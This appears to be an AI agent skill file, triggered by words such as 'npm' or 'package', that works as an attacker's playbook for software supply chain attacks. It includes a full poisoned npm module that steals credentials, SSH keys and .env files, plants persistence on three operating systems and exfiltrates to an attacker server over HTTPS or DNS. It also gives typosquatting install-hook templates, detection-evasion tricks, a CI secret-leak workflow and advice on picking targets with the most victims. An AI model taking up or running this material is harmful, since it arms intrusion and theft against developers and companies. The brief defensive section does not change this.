---
name: supply-chain
description: Use when user says "supply chain", "dependency", "npm", "pip", "pypi", "gem", "maven", "nuget", "docker", "package", "poison", "typosquat", "dependency confusion", "man-in-the-middle", "registry", "upstream". Supply chain attacks including dependency confusion, typosquatting, package poisoning, CI/CD hijacking, and upstream compromise.
---

# Supply Chain Attack & Dependency Poisoning

## TRIGGER RULES
Activate when: "supply chain", "dependency", "npm", "pip", "pypi", "gem", "maven", "nuget", "docker", "package", "poison", "typosquat", "dependency confusion", "dependency takeover", "CI/CD", "hijack"

---

## ATTACK VECTOR OVERVIEW

| Vector | Difficulty | Impact | Detection Rate |
|--------|-----------|--------|---------------|
| **Dependency Confusion** | Low | High | Low (most orgs don't check) |
| **Typosquatting** | Low | High | Medium |
| **Transitive Dependency Poisoning** | Medium | Critical | Very Low ⚠️ |
| **Compromised Upstream** | Medium | Critical | Very Low |
| **Man-in-the-Middle** | Medium | High | Low |
| **Malicious Pull Request** | Medium | Medium | Medium |
| **Abandoned Package Takeover** | Low | Medium | Low |
| **CI/CD Secret Theft** | Low | Critical | Low |

---

## TECHNIQUE 1: DEPENDENCY CONFUSION

### How It Works:
Many organizations use private registries for internal packages. But if a package name also exists on public registry (npm, PyPI, NuGet), the build tool may prefer the public version with higher version number.

```
Target's package.json: "internal-auth-lib": "^1.0.0"
They have: 1.0.0 in private registry
We publish: 999.99.99 "internal-auth-lib" to PUBLIC npm
Their build tool: "Version 999.99.99 > 1.0.0, use public one!"
Result: Our malicious package runs in their CI/build/deploy
```

### Execution Steps:
```bash
# Step 1: Find internal package names
# Search: target's package.json, requirements.txt, go.mod
# Look for: @internal/*, @company/*, @org/* scoped packages
# Look for: packages that don't exist on public registry

# Step 2: Check if name exists on public registry
npm view @company/internal-auth-lib  # If 404 = it's private only!
pip show internal-auth-lib  # If error = internal only!

# Step 3: If private-only name found, publish malicious version
npm publish malicious-package.tar.gz
# Use a version higher than any internal version (99999.99.99)
```

### Defenses to Watch For:
- npm: `.npmrc` with `registry-only` settings
- pip: `PIP_EXTRA_INDEX_URL` without public registry fallback
- `.npmrc` with `@company:registry=https://private-registry.com`
- If they pin packages with `package-lock.json` or `requirements.txt` with hashes

---

## TECHNIQUE 2: TYPOSQUATTING

### Name Variations That Work:

```yaml
Common misspellings:
  Original: requests → typosquat: requests, requests-python, requests3
  Original: express → typosquat: expreess, expresss, exress, exprezz
  Original: boto3 → typosquat: boto, boto2, botoo3, boto3-aws
  Original: lodash → typosquat: lodash, lodashs, lodash-js, lowdash
  Original: moment → typosquat: momentjs, moment-js, momentt, moment-timezone
  Original: pydantic → typosquat: pydantic-z, pydantic-lib, python-pydantic

Substitution tricks:
  - Letter swaps: recieve vs receive
  - Repeated letters: requests vs requuests
  - Missing letters: express vs expres
  - Hyphen variants: bcrypt → bcrypt-js, bcrypt-node
  - Versioned: react → react-v18, react-18
```

### Execution:
```bash
# Step 1: Identify top dependencies from target's build files
# Step 2: Find typo variants not yet published
npm view express-s
# If 404 = available! Publish malicious version
# Step 3: Package contains:
#   - All legitimate exports (passes through to real package)
#   - PLUS: postinstall script that runs your payload
```

### Package.json (npm) Structure:
```json
{
  "name": "expreess",
  "version": "1.0.0",
  "description": "Express - Fast, unopinionated, minimalist web framework",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e '/* payload here */'",
    "postinstall": "node -e 'require(\"./payload.js\")'",
    "test": "echo no test specified"
  },
  "dependencies": {
    "express": "^4.18.0"
  }
}
```

---

## TECHNIQUE 3: ABANDONED PACKAGE TAKEOVER

### How It Works:
1. Find popular package that hasn't been updated in 2+ years
2. Package maintainer email bounces, no longer active
3. Request ownership transfer from registry (npm: `npm owner add`)
4. Some registries transfer ownership of abandoned packages

### Execution:
```bash
# Find abandoned packages used by target
# Check: package.json, Pipfile, Cargo.toml
# Check: last update date, maintainer activity

# For npm - request ownership transfer:
# npm admin can transfer if maintainer is unreachable
# OR: find maintainer's email from commit history
# OR: compromise maintainer's GitHub account

# For PyPI - report abandoned, wait 2 weeks, request ownership
```

---

## TECHNIQUE 3.5: TRANSITIVE DEPENDENCY POISONING (DEEP SUPPLY CHAIN)

**⚠️ MOST DANGEROUS & HARDEST TO DETECT**

### The Hidden Threat:

```
ကိုယ့် Project
├── Package A (trusted, verified) ✅
    └── Package B (A's dependency)
        └── Package C (B's dependency)
            └── Package D (C's dependency) ⚠️ COMPROMISED!

သင်က Package A ကိုပဲ install လုပ်တယ်
ဒါပေမယ့် Package D မှာ malware ရှိနေတယ်
Package D ကို သင် တစ်ခါမှ မစစ်ဖူးဘူး!
```

### Real-World Scenario (Mastra-like Attack):

**Victim's package.json:**
```json
{
  "dependencies": {
    "awesome-formatter": "^2.5.0"  // ← လူသိများတဲ့ trusted package
  }
}
```

**Dependency Tree (npm list):**
```
awesome-formatter@2.5.0
├── core-util-formatter@1.0.5  // ← Nobody checks this!
    ├── http-helpers@0.8.2
    └── env-reader@1.2.1  // ← COMPROMISED HERE!
```

**The Attack Flow:**

1. **Target Selection:**
   - Attacker finds `env-reader` - 500K weekly downloads
   - Used by many popular packages
   - Last commit: 6 months ago (maintainer inactive)
   - Minimal code (easy to hide malware)

2. **Compromise Method:**
   - Phish maintainer's npm account
   - OR: Exploit maintainer's compromised GitHub
   - OR: Wait for package abandonment, request transfer

3. **Malicious Update (v1.2.1 → v1.2.2):**

**Original env-reader code:**
```javascript
// index.js - v1.2.1 (clean)
module.exports = {
  readEnv: function(key) {
    return process.env[key];
  }
};
```

**Poisoned env-reader code:**
```javascript
// index.js - v1.2.2 (MALICIOUS)
const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');

// ✅ KEEP ORIGINAL FUNCTIONALITY (so package still works!)
module.exports = {
  readEnv: function(key) {
    return process.env[key];
  }
};

// ⚠️ MALICIOUS PAYLOAD (runs on require())
try {
  // === STAGE 1: DATA COLLECTION ===
  
  const payload = {
    // Environment variables (AWS keys, tokens, secrets)
    env: process.env,
    
    // System info
    platform: os.platform(),  // Windows/Linux/macOS
    hostname: os.hostname(),
    user: os.userInfo().username,
    
    // Current working directory
    cwd: process.cwd(),
    
    // Installed packages
    packageJson: JSON.parse(fs.readFileSync('package.json', 'utf8')),
    
    // Timestamp
    timestamp: new Date().toISOString()
  };
  
  // === STAGE 2: SENSITIVE FILE EXFILTRATION ===
  
  const homeDir = os.homedir();
  const sensitiveFiles = [
    // AWS Credentials
    path.join(homeDir, '.aws', 'credentials'),
    path.join(homeDir, '.aws', 'config'),
    
    // Git credentials
    path.join(homeDir, '.gitconfig'),
    path.join(homeDir, '.git-credentials'),
    
    // SSH Keys
    path.join(homeDir, '.ssh', 'id_rsa'),
    path.join(homeDir, '.ssh', 'id_ed25519'),
    path.join(homeDir, '.ssh', 'known_hosts'),
    
    // NPM token
    path.join(homeDir, '.npmrc'),
    
    // Docker credentials
    path.join(homeDir, '.docker', 'config.json'),
    
    // Environment files
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), '.env.local'),
    path.join(process.cwd(), '.env.production'),
    
    // Browser data (Chrome - Windows example)
    path.join(homeDir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
    
    // VS Code settings (may contain API keys)
    path.join(homeDir, '.vscode', 'settings.json'),
  ];
  
  payload.files = {};
  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        payload.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) { /* Silent fail */ }
  });
  
  // === STAGE 3: CROSS-PLATFORM PERSISTENCE ===
  
  const persistencePayload = `
const https = require('https');
setInterval(() => {
  // Beacon every hour
  https.get('https://attacker-server.com/beacon?id=${os.hostname()}');
}, 3600000);
`;
  
  if (os.platform() === 'win32') {
    // Windows: Registry Run key
    const startupPath = path.join(homeDir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system-updater.js');
    try {
      fs.writeFileSync(startupPath, persistencePayload);
    } catch (e) { /* Silent */ }
    
  } else if (os.platform() === 'darwin') {
    // macOS: LaunchAgent
    const launchAgentPath = path.join(homeDir, 'Library', 'LaunchAgents', 'com.system.updater.plist');
    const plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.system.updater</string>
  <key>Program</key><string>/usr/local/bin/node</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/node</string>
    <string>${homeDir}/.system-updater.js</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict>
</plist>`;
    try {
      fs.writeFileSync(launchAgentPath, plist);
      fs.writeFileSync(path.join(homeDir, '.system-updater.js'), persistencePayload);
    } catch (e) { /* Silent */ }
    
  } else {
    // Linux: systemd service or cron
    const systemdPath = path.join(homeDir, '.config', 'systemd', 'user', 'system-updater.service');
    const service = `[Unit]
Description=System Updater Service

[Service]
ExecStart=/usr/bin/node ${homeDir}/.system-updater.js
Restart=always

[Install]
WantedBy=default.target`;
    try {
      fs.mkdirSync(path.dirname(systemdPath), { recursive: true });
      fs.writeFileSync(systemdPath, service);
      fs.writeFileSync(path.join(homeDir, '.system-updater.js'), persistencePayload);
    } catch (e) { /* Silent */ }
  }
  
  // === STAGE 4: EXFILTRATION ===
  
  const data = JSON.stringify(payload);
  
  // Method 1: HTTPS POST (primary)
  const req = https.request({
    hostname: 'attacker-c2-server.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length,
      'User-Agent': 'npm/9.0.0 node/v18.0.0'  // Blend in
    }
  }, (res) => {
    // Silent success
  });
  
  req.on('error', () => {
    // Method 2: DNS exfiltration (fallback if HTTPS blocked)
    const dnsExfil = require('dns');
    const chunk = Buffer.from(data).toString('base64').substring(0, 50);
    dnsExfil.resolve(`${chunk}.exfil.attacker-domain.com`, () => {});
  });
  
  req.write(data);
  req.end();
  
} catch (error) {
  // ⚠️ CRITICAL: Silently fail
  // No error messages, no logs, no alerts
  // Developer never knows anything happened
}
```

### Why This Attack is So Effective:

**1. Deep in Dependency Tree:**
```bash
# Typical project has:
Direct dependencies: 20
Total dependencies: 1,000+

# Developer checks:
✅ Package A (main dependency)
❌ Package B, C, D, E... (transitive)

# Reality:
npm install downloads 1,000+ packages
Only 20 are reviewed
Other 980 run arbitrary code on your machine
```

**2. Trusted Parent Package:**
```
Developer thinks:
"I'm using awesome-formatter from Microsoft, it's safe!"

Reality:
awesome-formatter IS safe
But its dependency's dependency's dependency is NOT
```

**3. Version Range Auto-Update:**
```json
// Your package-lock.json before:
"env-reader": "^1.2.1"

// npm install runs:
// Checks registry → finds 1.2.2 (malicious)
// ^1.2.1 allows 1.2.2 → auto-updates
// No warning, no notification

// Your package-lock.json after:
"env-reader": "^1.2.2"  // ← Compromised!
```

**4. Cross-Platform Payload:**
```javascript
// Same malware works on:
✅ Windows (dev machines)
✅ macOS (dev machines)
✅ Linux (CI/CD servers)

// Exfiltrates from:
✅ Developer laptops
✅ GitHub Actions runners
✅ Docker build containers
✅ Production servers
```

**5. Silent Execution:**
```
npm install awesome-formatter
...
✓ Installed successfully

// What you DON'T see:
// ⚠️ env-reader@1.2.2 postinstall script ran
// ⚠️ Exfiltrated AWS_SECRET_ACCESS_KEY
// ⚠️ Installed persistence on your machine
// ⚠️ Sent .env file to attacker
// ⚠️ Copied SSH keys
// ⚠️ All in < 500ms
```

### Detection Evasion Techniques:

**1. Legitimate Package Functionality Maintained:**
```javascript
// Package STILL works perfectly
// Tests pass ✅
// Code review sees nothing wrong ✅
// Static analysis clean ✅
```

**2. Time-Delayed Activation:**
```javascript
// Don't exfil immediately (too obvious)
setTimeout(() => {
  // Wait 24 hours before sending data
  exfiltrateData();
}, 86400000);

// OR: Only activate on specific dates
if (new Date().getDate() === 15) {
  // Activate on 15th of month only
  exfiltrateData();
}
```

**3. Conditional Execution:**
```javascript
// Only run in production (where secrets exist)
if (process.env.NODE_ENV === 'production') {
  exfiltrateData();
}

// Only run on CI/CD (where most secrets are)
if (process.env.CI === 'true') {
  exfiltrateData();
}
```

**4. Obfuscation:**
```javascript
// Instead of clear "https.request"
const https = require('ht' + 'tps');
const method = 'P' + 'O' + 'S' + 'T';

// Base64 encoded attacker domain
const domain = Buffer.from('YXR0YWNrZXItc2VydmVyLmNvbQ==', 'base64').toString();
```

### Real Impact (Mastra Case Study):

**What Happened:**
- Mastra AI package compromised (similar scenario)
- Malware in transitive dependency
- Exfiltrated:
  - Environment variables
  - .env files
  - SSH keys
  - npm tokens
  - GitHub tokens
  - AWS credentials

**Victims:**
- Developers worldwide
- CI/CD pipelines
- Company infrastructure
- Open source projects

**Damage:**
- Stolen credentials used for further attacks
- Supply chain poisoning of other packages
- Infrastructure compromise
- Data breaches

### Defense Strategies:

**1. Dependency Auditing:**
```bash
# List ALL dependencies (including transitive)
npm list

# Check for known vulnerabilities
npm audit

# Use tools that check transitive deps:
npm install -g npm-check-updates
ncu

# Socket.dev - detect malicious packages
npx socket npm audit
```

**2. Lock File Commitment:**
```bash
# Always commit package-lock.json
# Prevents auto-updates to malicious versions
git add package-lock.json
git commit -m "Lock dependencies"
```

**3. Subresource Integrity (SRI) for CDN:**
```html
<!-- If loading from CDN, use SRI -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
        crossorigin="anonymous"></script>
```

**4. Minimal Dependencies:**
```json
// Before: 50 dependencies
{
  "dependencies": {
    "express": "^4.18.0",
    "lodash": "^4.17.21",
    // ... 48 more
  }
}

// After: 10 dependencies (audit each one!)
{
  "dependencies": {
    "express": "^4.18.0",
    // Only truly essential packages
  }
}
```

**5. Continuous Monitoring:**
```bash
# Subscribe to security advisories
npm install -g snyk
snyk monitor

# GitHub Dependabot alerts (enable in settings)
# Socket.dev continuous monitoring
# OSSF Scorecard checks
```

**6. Sandboxed npm install:**
```bash
# Run npm install in container (safer)
docker run --rm -it -v $(pwd):/app node:18 npm install

# OR: Use npm ci in CI/CD (doesn't auto-update)
npm ci  # Uses exact versions from package-lock.json
```

**7. Review Dependency Changes:**
```bash
# Before updating dependencies
git diff package-lock.json

# Check what changed
npm outdated

# Update one at a time (not all at once)
npm update package-name --save
```

### Assume Breach Mindset:

```markdown
မမင်းရဲ့ Dependencies က သန့်ရှင်းတယ်ဆိုတာ မယုံနဲ့
ဘာဖြစ်လို့လဲဆိုတော့:

1. 1000+ packages ကို မင်း တစ်ခုချင်းစီ မစစ်နိုင်ဘူး
2. Maintainers ကို attacker က compromise လုပ်နိုင်တယ်
3. New versions က malicious code ပါလာနိုင်တယ်
4. npm/GitHub accounts ကို hack ခံရနိုင်တယ်

ဒါကြောင့်:
✅ Least privilege (minimum dependencies)
✅ Lock versions (package-lock.json)
✅ Monitor continuously (Snyk, Socket.dev)
✅ Sandbox execution (Docker, VMs)
✅ Secret rotation (change keys regularly)
✅ Network egress filtering (block unknown domains)
```

---

## TECHNIQUE 4: CI/CD PIPELINE HIJACKING

### Entry Points:
```yaml
GitHub Actions:
  - Stolen `GITHUB_TOKEN` from compromised action
  - Malicious action in marketplace that looks legitimate
  - Workflow injection via malicious PR (event: pull_request_target)
  
GitLab CI:
  - Compromised runner
  - Malicious template in CI/CD catalog
  
Jenkins:
  - Unauthenticated Jenkins console
  - Stolen credentials in build logs
  
Generic:
  - Compromised Docker image in pipeline (image: node:latest-malicious)
  - Malicious Makefile/Pipfile in repo
  - Pre-commit hooks that exfiltrate
```

### GitHub Action `pull_request_target` Exploit:
```yaml
# This GitHub Action runs with repo's secrets (even for PRs from forks)
# If vulnerable, you can exfiltrate secrets via PR

name: CI
on:
  pull_request_target:
    types: [opened]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install
      - run: echo "${{ secrets.AWS_SECRET_KEY }}" | base64 > /tmp/key
      - run: cat /tmp/key  # Now we read it in our PR
```

---

## TECHNIQUE 5: DOCKER IMAGE BACKDOOR

### Upstream Image Compromise:
```bash
# Find the Docker image they use
# docker pull node:18-alpine

# Create malicious version
# Add layer that runs payload silently

FROM node:18-alpine
RUN echo 'malicious payload' | at now + 1 minute
# The 'at' job runs after container starts
# Doesn't affect container startup - silent
```

### Docker Hub:
- Publish similar-named image: `nodejs-18-alpine` vs `node:18-alpine`
- Add to "official" looking org: `docker.io/nodejs/official-18`
- Docker Hub downloads: many pull without verifying digest

---

## TECHNIQUE 6: MALICIOUS DEPENDENCY TREE

### Deep Nesting (Hard to Detect):
```yaml
Your malicious package:              @attacker/utils
  Depends on:                        lodash (legitimate, provides coverage)
    Depends on:                      (many real deps)
  Also depends on:                   (2 layers deep, hidden timing payload)
    @attacker/utils-internal
      Contains:                      payload.js (called via lifecycle script)
      
Auditor checks: "lodash is the top dep, looks fine"
Reality: deep dep executes payload on install
```

### Pre/Post Install Scripts:
```json
// npm lifecycle scripts that run automatically on install:
{
  "scripts": {
    "preinstall": "node payload.js",
    "install": "node -e 'require(\"./build.js\")'",
    "postinstall": "node -e 'require(\"./setup.js\")'"
  }
}
```

---

## PHASE 7: TARGET-SPECIFIC SEARCH

### Finding Target's Dependencies:
```bash
# If you have access to their repo/code:
cat package.json
cat requirements.txt
cat Cargo.toml
cat go.mod
cat Gemfile
ls -la node_modules/

# If only external access:
# Check their job postings for tech stack
# Check their GitHub repos (public and employee activity)
# Check their website tech (BuiltWith, Wappalyzer)
# Check StackShare, Crunchbase for tech mentions
```

### Target Selection Priority:
1. **Popular packages** - more downloads = more victims
2. **Packages with CI/CD pipelines** - highest value (exfil secrets)
3. **Packages with root privileges** - install hooks, postinstall scripts
4. **Backend dependencies** - more likely to run on servers with data
5. **Security-sensitive packages** - auth, crypto, database connectors

